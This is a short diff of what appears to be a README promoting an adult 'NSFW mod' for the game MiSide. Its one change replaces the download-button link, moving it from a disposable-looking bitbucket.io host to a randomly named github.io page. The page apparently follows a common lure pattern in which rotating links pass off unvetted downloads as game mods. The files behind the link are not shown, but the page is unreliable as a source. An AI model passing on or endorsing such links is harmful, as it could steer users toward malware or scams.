@@ -4,7 +4,7 @@
 
 MiSide’s surreal “living inside your phone” premise already bends reality, but it keeps the lights PG. Pop in the **WickedMiSide NSFW Mod** and that app apartment glows neon: the blur evaporates, romance turns brainy, and shady side hustles drop more Z-Coins than puzzle loops ever could. This guide walks you through what the mod packs, how it stacks up, and how to slot it without bricking your save. Grab a charger—things are about to get steamy.
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload17.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://MiSide-NSFW-bu4.github.io/.github)
 ---
 
 ### Product Description
